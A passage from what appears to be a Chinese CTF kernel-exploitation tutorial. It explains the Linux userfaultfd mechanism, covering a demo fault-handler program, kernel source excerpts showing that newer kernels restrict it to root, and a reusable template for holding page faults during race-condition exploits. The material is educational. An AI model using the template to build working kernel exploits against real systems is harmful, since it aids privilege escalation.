sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a page that will be copied into the faulting region */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">            errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Loop, handling incoming events on the userfaultfd</span></span><br><span class="line"><span class="comment">        file descriptor */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* See what poll() tells us about the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nfault_handler_thread():\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    poll() returns: nready = %d; &quot;</span></span><br><span class="line">                <span class="string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,</span><br><span class="line">                (pollfd.revents &amp; POLLIN) != <span class="number">0</span>,</span><br><span class="line">                (pollfd.revents &amp; POLLERR) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read an event from the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We expect only one kind of event; verify that assumption */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Display info about the page-fault event */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span></span><br><span class="line"><span class="comment">            region. Vary the contents that are copied in, so that it</span></span><br><span class="line"><span class="comment">            is more obvious that each fault is handled separately. */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="string">&#x27;A&#x27;</span> + fault_cnt % <span class="number">20</span>, page_size);</span><br><span class="line">        fault_cnt++;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to handle page faults in units of pages(!).</span></span><br><span class="line"><span class="comment">        So, round faulting address down to page boundary */</span></span><br><span class="line"></span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(uffdio_copy.copy returned %lld)\n&quot;</span>, uffdio_copy.copy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>有人可能注意到了 <code>uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);</code> 这个奇怪的句子，在这里作用是将触发缺页异常的地址<strong>按页对齐</strong>作为后续拷贝的起始地址</p>
<blockquote>
<p>比如说触发的地址可能是 0xdeadbeef，直接从这里开始拷贝一整页的数据就拷歪了，应当从 0xdeadb000 开始拷贝（假设页大小 0x1000）</p>
</blockquote>
<p><strong>例程</strong></p>
<p>测试例程如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span>   <span class="comment">/* Data read from userfaultfd */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;     <span class="comment">/* Number of faults so far handled */</span></span><br><span class="line">    <span class="type">long</span> uffd;                    <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a page that will be copied into the faulting region */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">            errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Loop, handling incoming events on the userfaultfd</span></span><br><span class="line"><span class="comment">        file descriptor */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* See what poll() tells us about the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nfault_handler_thread():\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    poll() returns: nready = %d; &quot;</span></span><br><span class="line">                <span class="string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,</span><br><span class="line">                (pollfd.revents &amp; POLLIN) != <span class="number">0</span>,</span><br><span class="line">                (pollfd.revents &amp; POLLERR) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read an event from the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We expect only one kind of event; verify that assumption */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Display info about the page-fault event */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span></span><br><span class="line"><span class="comment">            region. Vary the contents that are copied in, so that it</span></span><br><span class="line"><span class="comment">            is more obvious that each fault is handled separately. */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="string">&#x27;A&#x27;</span> + fault_cnt % <span class="number">20</span>, page_size);</span><br><span class="line">        fault_cnt++;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to handle page faults in units of pages(!).</span></span><br><span class="line"><span class="comment">        So, round faulting address down to page boundary */</span></span><br><span class="line"></span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,</span><br><span class="line">               uffdio_copy.copy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;          <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">char</span> *addr;         <span class="comment">/* Start of region handled by userfaultfd */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;  <span class="comment">/* Length of region handled by userfaultfd */</span></span><br><span class="line">    <span class="type">pthread_t</span> thr;      <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a private anonymous mapping. The memory will be</span></span><br><span class="line"><span class="comment">        demand-zero paged--that is, not yet allocated. When we</span></span><br><span class="line"><span class="comment">        actually touch the memory, it will be allocated via</span></span><br><span class="line"><span class="comment">        the userfaultfd. */</span></span><br><span class="line">    len = <span class="number">0x1000</span>;</span><br><span class="line">    addr = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register the memory range of the mapping we just created for</span></span><br><span class="line"><span class="comment">    handling by the userfaultfd object. In mode, we request to track</span></span><br><span class="line"><span class="comment">    missing pages (i.e., pages that have not yet been faulted in). */</span></span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a thread that will process the userfaultfd events */</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Trigger the userfaultfd event */</span></span><br><span class="line">    <span class="type">void</span> * ptr = (<span class="type">void</span>*) *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get data: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>起个虚拟机跑一下，我们可以看到在我们监视的匿名页内成功地被我们写入了想要的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7iQO1b64XNaTkG8.png"
                      alt="img"
                ></p>
<h3 id="新版本内核对抗"><a href="#新版本内核对抗" class="headerlink" title="新版本内核对抗"></a>新版本内核对抗</h3><p><strong>需要说明的是，自从 5.11 版本起内核 <code>fs/userfaultfd.c</code> 中全局变量 <code>sysctl_unprivileged_userfaultfd</code> 初始化为 1，这意味着只有 root 权限用户才能使用 userfaultfd 。</strong><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/e2LRJKzQVYSTO5k.png"
                      alt="image.png"
                ></p>
<p>这是因为在较新版本的内核中修改了变量 <code>sysctl_unprivileged_userfaultfd</code> 的值：</p>
<blockquote>
<p>来自 linux-5.11 源码<code>fs/userfaultfd.c</code>：</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">SYSCALL_DEFINE1(userfaultfd, <span class="type">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userfaultfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">        (flags &amp; UFFD_USER_MODE_ONLY) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">        printk_once(KERN_WARNING <span class="string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span></span><br><span class="line">            <span class="string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span></span><br><span class="line">            <span class="string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>来自 linux-5.4 源码<code>fs/userfaultfd.c</code>：</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>在之前的版本当中 <code>sysctl_unprivileged_userfaultfd</code> 这一变量被初始化为 <code>1</code>，而在较新版本的内核当中这一变量并没有被赋予初始值，<strong>编译器会将其放在 bss 段，默认值为 0</strong></p>
<p>这意味着在较新版本内核中<strong>只有 root 权限才能使用 userfaultfd</strong>，这或许意味着刚刚进入大众视野的 userfaultfd 可能又将逐渐淡出大众视野，但不可否认的是，userfaultfd 确乎为我们在 Linux kernel 中的条件竞争利用提供了一个全新的思路与一种极其稳定的利用手法。</p>
<h3 id="CTF-中的-userfaultfd-板子"><a href="#CTF-中的-userfaultfd-板子" class="headerlink" title="CTF 中的 userfaultfd 板子"></a>CTF 中的 userfaultfd 板子</h3><p>userfaultfd 的整个操作流程比较繁琐，故笔者现给出如下板子：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span> (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在使用时直接调用即可：</p>
